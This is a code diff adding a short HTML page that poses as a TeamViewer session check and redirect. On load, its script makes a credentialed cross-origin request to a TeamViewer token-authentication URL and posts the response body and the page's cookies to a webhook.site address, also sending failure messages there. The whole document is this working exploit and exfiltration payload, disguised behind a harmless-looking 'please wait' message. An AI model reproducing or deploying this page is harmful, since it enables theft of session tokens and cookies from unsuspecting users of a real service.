@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking Session Status...</title>
+</head>
+<body>
+    <script>
+        async function runExploit() {
+            const target = "https://web.teamviewer.com/authenticate/withtoken?username=seventhholic@gmail.com";
+            const webhook = "https://webhook.site/975f12c3-4971-4843-804f-df3891ee3a4f";
+
+            try {
+                // This simulates the cross-origin request
+                const response = await fetch(target, {
+                    method: 'GET',
+                    credentials: 'include' // This is the key to sending/receiving cookies
+                });
+
+                const body = await response.text();
+
+                // Send whatever we found to your webhook
+                await fetch(webhook, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        status: "Success",
+                        data_captured: body,
+                        js_cookies: document.cookie // Stolen if not HttpOnly
+                    })
+                });
+            } catch (e) {
+                // If it fails, let's log WHY it failed (usually CORS block)
+                await fetch(webhook + "?error=" + btoa(e.message));
+            }
+        }
+        runExploit();
+    </script>
+    <h2>Please wait, redirecting to TeamViewer...</h2>
+</body>
+</html>
